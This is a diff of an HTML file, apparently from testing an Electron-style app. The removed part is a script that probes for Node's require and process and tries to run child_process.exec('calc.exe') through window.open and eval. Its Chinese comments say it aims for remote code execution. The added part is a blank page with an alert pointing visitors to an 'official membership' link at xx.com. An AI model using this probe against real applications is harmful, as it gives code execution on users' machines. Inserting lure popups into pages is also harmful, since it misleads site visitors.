@@ -1,32 +1,14 @@
+<!DOCTYPE html>
 <html>
-<body>
-<script>
-var result = 'require:' + typeof require + '|process:' + typeof process + '|open:' + typeof window.open;
-// 写到页面
-document.body.innerText = result;
+    <head>
+        <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+        <title></title>
+        
+    </head>
+    <body>
+        
+    </body>
 
-// 试试能不能直接拿到RCE
-try {
-    var w = window.open('about:blank');
-    document.body.innerText += '\nwindow.open=ok';
-    if (w) {
-        setTimeout(function() {
-            w.eval("require('child_process').exec('calc.exe')");
-        }, 500);
-    } else {
-        document.body.innerText += '\nwindow.open=null';
-    }
-} catch(e) {
-    document.body.innerText += '\nopenError:' + e.message;
-}
 
-// 如果window.open被拦截，试全局eval
-try {
-    eval("require('child_process').exec('calc.exe')");
-    document.body.innerText += '\ndirectEval=ok';
-} catch(e) {
-    document.body.innerText += '\ndirectEval:' + e.message;
-}
-</script>
-</body>
+<script>alert('官方会员领取请前往：https://xx.com')</script>
 </html>
